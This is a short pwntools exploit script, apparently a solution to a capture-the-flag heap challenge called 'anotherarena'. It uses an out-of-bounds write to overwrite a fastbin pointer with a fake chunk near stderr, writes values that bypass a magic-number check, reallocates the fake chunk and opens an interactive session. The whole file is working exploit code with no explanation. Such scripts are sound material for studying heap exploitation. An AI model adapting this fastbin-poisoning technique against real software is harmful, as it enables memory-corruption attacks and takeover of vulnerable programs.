from pwn import *

fake_chunk = 0x6020bd

def oob_write(offset, data):
	r.send(p32(offset))
	r.send(p32(data))
	return

def write(offset, data):
	r.send(p32(offset))
	r.send(p32(data))
	return

def pwn():

  r.sendline("60")
  # overwrite fastbinsY[5] with an area close to stderr
  #
  # 0x6020a5 <stdout+5>:	0x000000000000007f	0xfff7bb48e0000000
  # 0x6020b5 <stdin+5>:	0x000000000000007f	0xfff7bb5540000000
  # 0x6020c5 <stderr+5>:	0x000000000000007f
  oob_write(0xfffff790, fake_chunk)
  # pass the 0xC0C0AFF6 check
  write(0, 0x7fffffff)
  write(4, 0x40c0af8f)
    
  # break loop
  r.send(p32(0x31337))

  # get back the fake chunk
  r.sendline(str(0x68))
  r.send("A"*0x34) 

  r.interactive()

if __name__ == "__main__":
	r = process('./anotherarena')
	pause()
	pwn()
